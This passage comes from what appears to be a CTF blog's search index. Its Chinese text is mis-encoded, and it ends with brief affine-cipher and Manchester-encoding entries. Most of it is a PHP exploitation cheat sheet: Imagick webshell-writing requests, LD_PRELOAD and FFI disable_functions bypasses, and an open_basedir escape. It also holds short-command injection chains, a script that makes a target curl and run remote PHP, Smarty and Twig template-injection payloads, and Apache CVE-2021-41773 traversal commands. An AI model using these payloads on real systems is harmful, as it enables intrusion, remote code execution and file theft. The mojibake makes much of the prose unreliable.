$local_file, $server_file, FTP_BINARY)) &#123; echo &quot;Successfully written to $local_file\\n&quot;;&#125; else &#123; echo &quot;There was a problem\\n&quot;;&#125;ftp_close($ftp); â€‹ è¯»ç±»ä¿¡æ¯ ReflectionClass::export() â€‹ new+åŸç”Ÿç±» eval(&quot;echo new $a($b);&quot;); 12?a=Exception&amp;b=system(&#x27;whoami&#x27;)?a=SplFileObject&amp;b=system(&#x27;whoami&#x27;) echo new $a($b); 123456åˆ—ç›®å½•?a=DirectoryIterator&amp;b=glob://f*è¯»æ–‡ä»¶?a=SplFileObject&amp;b=1.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=1.php new $a($b); å‚è€ƒï¼šExploiting Arbitrary Object Instantiations in PHP without Custom Classes 12?a=Imagick&amp;b=http://121.40.253.177:7777nc -lvnp 7777 æŒ‰ç…§æ–‡ä¸­çš„POCï¼Œåœ¨VPSä¸­ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå«æœ‰ä¸€å¥è¯æœ¨é©¬ï¼š convert xc:red -set &#39;Copyright&#39; &#39;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#39; positiv e.png åœ¨VPSä¸­ç›‘å¬12345ç«¯å£ï¼Œå†å¾€æœåŠ¡å™¨å‘é€è¯·æ±‚åŒ…å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425POST /?b=Imagick&amp;c=vid:msl:/tmp/php* HTTP/1.1Host: 1.1.1.1:32127Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Length: 348------WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Disposition: form-data; name=&quot;123&quot;; filename=&quot;exec.msl&quot;Content-Type: text/plain&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;image&gt;&lt;read filename=&quot;http://vps:12345/positive.png&quot; /&gt;&lt;write filename=&quot;/var/www/html/positive.php&quot;/&gt;&lt;/image&gt;------WebKitFormBoundaryeTvfNEmqTayg6bqr-- å‘é€åï¼Œé¶æœºå°±å¾€VPSä¸­è¯·æ±‚äº†è¯¥æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠè¯¥æ–‡ä»¶ä¸‹è½½åˆ°äº†æŒ‡å®šç›®å½•ï¼Œè®¿é—®åå³å¯RCEã€‚ è¿™ç§æ‰‹æ³•çš„é™åˆ¶ï¼š éœ€è¦é€šç½‘ï¼Œå½“ç„¶å¦‚æœä¸é€šç½‘è¿™ç§æ‰‹æ³•ä¹Ÿå­˜åœ¨ä¸€ä¸ªé‡å‘½åæ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¦‚æœç½‘ç«™æœ‰ä¸Šä¼ åŠŸèƒ½å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ‰‹æ³•å°†æ¶æ„çš„JPGé‡å‘½åæˆPHPï¼› éœ€è¦çŸ¥é“ç½‘ç«™çš„ç›®å½•ï¼ˆæ¯”èµ›ä¸­é€šå¸¸æ˜¯/var/www/htmlæˆ–è€…/appè¿™ç±»ï¼‰ï¼› éœ€è¦åœ¨ç½‘ç«™ç›®å½•ä¸‹æœ‰å†™æƒé™ï¼Œå½“ç„¶å¦‚æœçŸ¥é“ç±»ä¼¼äºuploadè¿™ç§æ–‡ä»¶å¤¹çš„è·¯å¾„ä¹Ÿå¯ä»¥ï¼ˆå› ä¸ºé€šå¸¸å®ƒä»¬æ˜¯å¯å†™çš„ï¼› æœ€æœ€é‡è¦çš„ï¼šéœ€è¦æœ‰è£…Imagickæ‰©å±•ï¼Œè¯¥æ‰©å±•å…¶å®ä¸æ˜¯é»˜è®¤è‡ªå¸¦çš„ï¼ˆä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†æ”»å‡»é¢ï¼‰ã€‚ $class = new $a($b) 12$class=new Exception(&quot;test string&quot;);echo $classâ€&gt;__toString(); â€‹ bypass disable_function LD_PRELOAD Linuxæ“ä½œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“åœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå…ˆè¯»å–LD_PRELOADç¯å¢ƒå˜é‡å’Œé»˜è®¤é…ç½®æ–‡ä»¶ /etc/ld.so.preloadï¼Œå¹¶å°†è¯»å–åˆ°çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶è¿›è¡Œé¢„åŠ è½½ï¼Œå³ä½¿ç¨‹åºä¸ä¾èµ–è¿™äº›åŠ¨æ€é“¾æ¥åº“ï¼ŒLD_PRELOADç¯å¢ƒå˜é‡å’Œ /etc/ld.so.preload é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¾ç„¶ä¼šè¢«è£…è½½ï¼Œå› ä¸ºå®ƒä»¬çš„ä¼˜å…ˆçº§æ¯”LD_LIBRARY_PATHç¯å¢ƒå˜é‡æ‰€å®šä¹‰çš„é“¾æ¥åº“æŸ¥æ‰¾è·¯å¾„çš„æ–‡ä»¶ä¼˜å…ˆçº§è¦é«˜ï¼Œæ‰€ä»¥èƒ½å¤Ÿæå‰äºç”¨æˆ·è°ƒç”¨çš„åŠ¨æ€åº“è½½å…¥ã€‚ é€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡ï¼Œèƒ½å¤Ÿè½»æ˜“çš„åŠ è½½ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚é€šè¿‡è¿™ä¸ªåŠ¨æ€åº“åŠ«æŒç³»ç»ŸAPIå‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ‰§è¡Œæ¤å…¥çš„ä»£ç ã€‚ åˆ©ç”¨ error_log ä¸ mail å‡½æ•°åŠ«æŒ getuid å‡½æ•°ï¼Œç³»ç»Ÿé€šè¿‡ç¯å¢ƒå˜é‡(env)ä¸­çš„LD_PRELOADåŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚ 12345678910111213// hack.c// å°†å…¶æŒ‰ç…§ç³»ç»Ÿæ“ä½œä½æ•°ç”Ÿæˆå¯¹åº”çš„soæ–‡ä»¶// gcc -c -fPIC hack.c -o hack// gcc --share hack -o hack.so#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);&#125; å‡½æ•°æ›¿ä»£ï¼šmail() -&gt; mb_send_mail() å‚è€ƒ åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡php disable_functionæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ RCTF 2022 - filechecker-pro-max UAF php7-gc-bypassï¼Œphp7-backtrace-bypassï¼Œphp-json-bypass æ³•1ï¼šä¿®æ”¹pwn()ä¼ å…¥çš„cmdï¼Œä¸Šä¼ phpè‡³å¯å†™ç›®å½•ï¼ŒincludeåŒ…å«æ‰§è¡Œã€‚ æ³•2ï¼šæ— éœ€ä¸Šä¼ ï¼Œå°†ä»£ç æ”¾å…¥evalå‡½æ•°æ‰§è¡Œã€‚ å‚è€ƒé¢˜ buuoj-GKCTF2020-CheckIn FFI ä½¿ç”¨æ¡ä»¶ï¼šPHPç‰ˆæœ¬&gt;=7.4 123$ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;); readgzfile(&quot;good.txt&quot;); 123//ç›´æ¥è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°ï¼Œphp_execçš„typeä¸º3æ—¶å¯¹åº”çš„æ˜¯passthruï¼Œç›´æ¥å°†ç»“æœåŸå§‹è¾“å‡º$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]); 123456789//ä½¿ç”¨cé‡Œçš„popenï¼Œç„¶åä»ç®¡é“ä¸­è¯»å–ç»“æœ$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123; $d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/* å‚è€ƒ PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•° â€‹ bypass open_basedir12mkdir(&#x27;/tmp/test&#x27;);chdir(&#x27;/tmp/test&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;));@eval($_POST[a]); echo 1;chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/flag&#x27;)); â€‹ é•¿åº¦é™åˆ¶ 7å­—ç¬¦ 123456#å†™å…¥è¯­å¥&lt;?php eval($_GET[1]);#base64ç¼–ç åPD9waHAgZXZhbCgkX0dFVFsxXSk7#éœ€è¦è¢«æ‰§è¡Œçš„è¯­å¥ï¼šecho PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617#!/usr/bin/python# -*- coding: UTF-8 -*- import requests url = &quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip())) #æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸtest = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 5å­—ç¬¦ æ€è·¯1 æ‹¼æ¥å­—ç¬¦ä¸²å†™å…¥ä¸€å¥è¯ï¼ŒåŒ7å­—ç¬¦ã€‚ æ€è·¯2 1&lt;?php eval($_GET[1]); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;0&gt;a&gt;hp&gt;p\\\\&gt;1.\\\\&gt;\\&gt;\\\\&gt;-d\\\\&gt;\\ \\\\&gt;64\\\\&gt;se\\\\&gt;ba\\\\&gt;\\|\\\\&gt;7\\\\&gt;Sk\\\\&gt;X\\\\&gt;x\\\\&gt;Fs\\\\&gt;FV\\\\&gt;d\\\\&gt;X0\\\\&gt;k\\\\&gt;g\\\\&gt;bC\\\\&gt;h\\\\&gt;XZ\\\\&gt;gZ\\\\&gt;A\\\\&gt;aH\\\\&gt;w\\\\&gt;D9\\\\&gt;P\\\\&gt;S&#125;\\\\&gt;IF\\\\&gt;&#123;\\\\&gt;\\$\\\\&gt;o\\\\&gt;ch\\\\&gt;e\\\\sh 0sh f 12345678910111213#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip()))#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸtest = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 4å­—ç¬¦ æ€è·¯1 ä¼ å…¥&gt;catï¼Œåœ¨ç›®æ ‡ç›®å½•ä¸‹å†™å…¥catæ–‡ä»¶ï¼› å†ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ‰§è¡Œ&gt;* /*ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ã€‚ æ€è·¯2 å­—ç¬¦æ‹¼æ¥ 12345678&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v (ç­‰åŒäºå‘½ä»¤ï¼šdir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)&gt;rev*v&gt;0 (ç­‰åŒäºå‘½ä»¤ï¼šrev v &gt; 0)(0é‡Œé¢çš„å†…å®¹ä½:ls -th &gt;f)sh 0 (shæ‰§è¡Œ0é‡Œé¢çš„å†…å®¹) æ€è·¯3 åå¼¹shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibtarget = &#x27;http://52.197.41.31/&#x27; # å­˜æ”¾å¾…ä¸‹è½½æ–‡ä»¶çš„å…¬ç½‘ä¸»æœºçš„IPshell_ip = &#x27;xx.xx.xx.xx&#x27; # æœ¬æœºIPyour_ip = r.get(&#x27;http://ipv4.icanhazip.com/&#x27;).text.strip() # å°†shell_IPè½¬æ¢æˆåå…­è¿›åˆ¶ip = &#x27;0x&#x27; + &#x27;&#x27;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(&#x27;.&#x27;)]) reset = target + &#x27;?reset&#x27;cmd = target + &#x27;?cmd=&#x27;sandbox = target + &#x27;sandbox/&#x27; + hashlib.md5(&#x27;orange&#x27; + your_ip).hexdigest() + &#x27;/&#x27; # payloadæŸäº›ä½ç½®çš„å¯é€‰å­—ç¬¦pos0 = random.choice(&#x27;efgh&#x27;)pos1 = random.choice(&#x27;hkpq&#x27;)pos2 = &#x27;g&#x27; # éšæ„é€‰æ‹©å­—ç¬¦ payload = [ &#x27;&gt;dir&#x27;, # åˆ›å»ºåä¸º dir çš„æ–‡ä»¶ &#x27;&gt;%s&gt;&#x27; % pos0, # å‡è®¾pos0é€‰æ‹© f , åˆ›å»ºåä¸º f&gt; çš„æ–‡ä»¶ &#x27;&gt;%st-&#x27; % pos1, # å‡è®¾pos1é€‰æ‹© k , åˆ›å»ºåä¸º kt- çš„æ–‡ä»¶,å¿…é¡»åŠ ä¸ªpos1ï¼Œ # å› ä¸ºalphabeticalåºä¸­t&gt;s &#x27;&gt;sl&#x27;, # åˆ›å»ºåä¸º &gt;sl çš„æ–‡ä»¶ï¼›åˆ°æ­¤å¤„æœ‰å››ä¸ªæ–‡ä»¶ï¼Œ # ls çš„ç»“æœä¼šæ˜¯ï¼šdir f&gt; kt- sl &#x27;*&gt;v&#x27;, # å‰æ–‡æåˆ°ï¼Œ * ç›¸å½“äº `ls` ï¼Œé‚£ä¹ˆè¿™æ¡å‘½ä»¤ç­‰ä»·äº `dir f&gt; kt- sl`&gt;v ï¼Œ # å‰é¢æåˆ°diræ˜¯ä¸æ¢è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ—¶ä¼šåˆ›å»ºæ–‡ä»¶ v å¹¶å†™å…¥ f&gt; kt- sl # éå¸¸å¥‡å¦™ï¼Œè¿™é‡Œçš„æ–‡ä»¶åæ˜¯ v ï¼Œåªèƒ½æ˜¯v ï¼Œæ²¡æœ‰å¯é€‰å­—ç¬¦ &#x27;&gt;rev&#x27;, # åˆ›å»ºåä¸º rev çš„æ–‡ä»¶ï¼Œè¿™æ—¶å½“å‰ç›®å½•ä¸‹ ls çš„ç»“æœæ˜¯ï¼š dir f&gt; kt- rev sl v &#x27;*v&gt;%s&#x27; % pos2, # é­”æ³•å‘ç”Ÿåœ¨è¿™é‡Œï¼š *v ç›¸å½“äº rev v ï¼Œ* çœ‹ä½œé€šé…ç¬¦ã€‚å‰æ–‡ä¹Ÿæè¿‡äº†ï¼Œä½“ä¼šä¸€ä¸‹ã€‚ # è¿™æ—¶pos2æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ g æ–‡ä»¶å†…å®¹æ˜¯æ–‡ä»¶vå†…å®¹çš„åè½¬ï¼š ls -tk &gt; f # ç»­è¡Œåˆ†å‰² curl 0x11223344|php å¹¶é€†åºå†™å…¥ &#x27;&gt;p&#x27;, &#x27;&gt;ph\\&#x27;, &#x27;&gt;|\\&#x27;, &#x27;&gt;%s\\&#x27; % ip[8:10], &#x27;&gt;%s\\&#x27; % ip[6:8], &#x27;&gt;%s\\&#x27; % ip[4:6], &#x27;&gt;%s\\&#x27; % ip[2:4], &#x27;&gt;%s\\&#x27; % ip[0:2], &#x27;&gt; \\&#x27;, &#x27;&gt;rl\\&#x27;, &#x27;&gt;cu\\&#x27;, &#x27;sh &#x27; + pos2, # sh g ;g çš„å†…å®¹æ˜¯ ls -tk &gt; f ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠé€†åºçš„å‘½ä»¤åè½¬å›æ¥ï¼Œ # è™½ç„¶ f çš„æ–‡ä»¶å¤´éƒ¨ä¼šæœ‰æ‚è´¨ï¼Œä½†ä¸å½±å“æœ‰æ•ˆå‘½ä»¤çš„æ‰§è¡Œ &#x27;sh &#x27; + pos0, # sh f æ‰§è¡Œcurlå‘½ä»¤ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå†™å…¥æœ¨é©¬ã€‚] s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print &#x27;[%d]&#x27; % s.status_code, s.url sleep(0.1)s = r.get(sandbox + &#x27;fun.php?cmd=uname -a&#x27;)print &#x27;[%d]&#x27; % s.status_code, s.urlprint s.text â€‹ æ¨¡æ¿å¼•æ“å¯¹äºPHPçš„æ¨¡æ¿å¼•æ“ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯smartyæˆ–è€…twigã€‚ æ ¹æ®æµç¨‹å›¾æµ‹è¯•ï¼š smarty12345678910111213141516171819202122232425262728X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125; ï¼ˆæœ‰å›æ˜¾ï¼‰&#123;$smarty.version&#125; ï¼ˆsmartyç‰ˆæœ¬å·ï¼‰&#123;php&#125;phpinfo();&#123;/php&#125; ï¼ˆåºŸå¼ƒï¼‰&#123;if phpinfo()&#125;&#123;/if&#125;&#123;self::getStreamVariable(â€œfile:///etc/passwdâ€)&#125; ï¼ˆæ—§ç‰ˆæœ¬ï¼‰&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(\\&#x27;id\\&#x27;)&#125;&#x27;)&#125;&#123;function name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function &#x27;&#125;&#123;/function&#125;# Smarty3 string:&#123;include file=&#x27;C:/Windows/win.ini&#x27;&#125;string:&#123;function name=&#x27;x()&#123;&#125;;system(whoami);function &#x27;&#125;&#123;/function&#125; ï¼ˆCVE-2021-26120ï¼ŒSmarty&lt;3.1.39ï¼‰string:&#123;$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCompileDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCacheDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125; ï¼ˆCVE-2021-26119ï¼ŒSmarty=3.1.44/4.1.0ï¼‰eval:&#123;math equation=&#x27;(&quot;\\163\\171\\163\\164\\145\\155&quot;)(&quot;\\167\\150\\157\\141\\155\\151&quot;)&#x27;&#125; ï¼ˆCVE-2021-29454ï¼ŒPHP7ï¼ŒSmarty&lt;3.1.42/&lt;4.0.2ï¼‰ twig1234567891011121314&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;POST /subscribe?0=cat+/etc/passwd HTTP/1.1&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125; å‚è€ƒï¼šTWIG å…¨ç‰ˆæœ¬é€šç”¨ SSTI payloads â€‹ åæ··æ·†https://www.zhaoyuanma.com/phpjm.html https://yoursunny.com/p/PHP-decode/ â€‹ ä¸­é—´ä»¶æ¼æ´Apache Apache 2.4.49 CVE-2021-41773 ç›®å½•ç©¿è¶Šæ¼æ´ã€‚å¯ä»¥è¯»å–åˆ°ApacheæœåŠ¡å™¨Webç›®å½•ä»¥å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œæˆ–è€…è¯»å–Webä¸­çš„è„šæœ¬æºç ï¼Œæˆ–è€…åœ¨å¼€å¯cgiæˆ–cgidçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd curl -v --data &quot;echo;å‘½ä»¤&quot; &#39;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39; â€‹ å…¶ä»–opcacheopencacheæ˜¯ä¸€ç§php7è‡ªå¸¦çš„ç¼“å­˜å¼•æ“ï¼Œå®ƒå°†ç¼–è¯‘è¿‡ä¸€éçš„çš„phpè„šæœ¬ä»¥å­—èŠ‚ç æ–‡ä»¶çš„å½¢å¼ç¼“å­˜åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåœ¨php.iniä¸­æŒ‡å®šï¼‰ã€‚è¿™æ ·èŠ‚çœäº†æ¯æ¬¡è®¿é—®åŒä¸€è„šæœ¬éƒ½è¦åŠ è½½å’Œè§£æçš„æ—¶é—´å¼€é”€ã€‚ï¼ˆå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰binæ–‡ä»¶æœ‰å°±ç›´æ¥ç”¨ï¼‰ opcacheç¼“å­˜getshell","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"ä»¿å°„å¯†ç ","slug":"crypto-ä»¿å°„å¯†ç ","date":"2020-05-18T10:56:48.000Z","updated":"2020-06-14T07:33:04.957Z","comments":true,"path":"2020/05/18/crypto-ä»¿å°„å¯†ç /","permalink":"https://lazzzaro.github.io/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"ä»¿å°„å¯†ç ä»¿å°„å¯†ç æ˜¯ä¸€ç§æ›¿æ¢å¯†ç ã€‚å®ƒæ˜¯ä¸€ä¸ªå­—æ¯å¯¹ä¸€ä¸ªå­—æ¯çš„ã€‚ åŠ å¯†å‡½æ•° $e(x)=ax+b{\\pmod {m}}$ å…¶ä¸­ $a$ å’Œ $m$ äº’è´¨ï¼Œ$m$ æ˜¯å­—æ¯çš„æ•°ç›®ã€‚ è§£å¯†å‡½æ•° $d(x)=a^{-1}(x-b){\\pmod {m}}$ å…¶ä¸­ $a^{-1}$ æ˜¯ $a$ åœ¨ $ \\mathbb {Z} _{m}$ ç¾¤çš„ä¹˜æ³•é€†å…ƒã€‚ ä»¿å°„å¯†ç ä¸ºå•è¡¨åŠ å¯†çš„ä¸€ç§ï¼Œå­—æ¯ç³»ç»Ÿä¸­æ‰€æœ‰å­—æ¯éƒ½ç”±ç®€å•æ•°å­¦æ–¹ç¨‹åŠ å¯†ï¼Œå¯¹åº”è‡³æ•°å€¼ï¼Œæˆ–è½¬å›å­—æ¯ã€‚ å…¶ä»æœ‰æ‰€æœ‰æ›¿ä»£å¯†ç ä¹‹å¼±å¤„ã€‚æ‰€æœ‰å­—æ¯çš†å€Ÿç”±æ–¹ç¨‹ $(ax+b)\\pmod {26}$ åŠ å¯†ï¼Œ$b$ ä¸ºç§»åŠ¨å¤§å°ã€‚ å½“ $a=1$ï¼Œä»¿å°„åŠ å¯†ä¸ºå‡¯æ’’å¯†ç ï¼Œå› è¯¥åŠ å¯†æ–¹ç¨‹å¯ç®€åŒ–ä¸ºçº¿æ€§ç§»åŠ¨ã€‚ ä»£ç  å¯¹åº”å­—æ¯è¡¨ 1234# ä»¿å°„å¯†ç å¯¹åº”å­—æ¯è¡¨def affine(a, b): for i in range(26): print chr(i+65) + &quot;: &quot; + chr(((a*i+b)%26)+65) ä¸€èˆ¬æƒ…å†µ 123456789import gmpy2def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"æ›¼å½»æ–¯ç‰¹ç¼–ç ","slug":"crypto-æ›¼å½»æ–¯ç‰¹ç¼–ç ","date":"2020-05-17T13:26:35.000Z","updated":"2020-05-18T10:58:43.942Z","comments":true,"path":"2020/05/17/crypto-æ›¼å½»æ–¯ç‰¹ç¼–ç /","permalink":"https://lazzzaro.github.io/2020/05/17/crypto-%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/","excerpt":"","text":"manæœ‰2ä¸ªä¸åŒçš„è§„èŒƒï¼Œåœ¨äºŒè¿›åˆ¶ä½çš„å‘é€æ–¹å¼ä¸Šè¿˜æœ‰æ­£åºå’Œé€†åºä¹‹åˆ†ï¼Œæ‰€ä»¥å¯¹ç»™å®šçš„ç¼–ç åçš„æ•°æ®è¿›è¡Œè§£ç 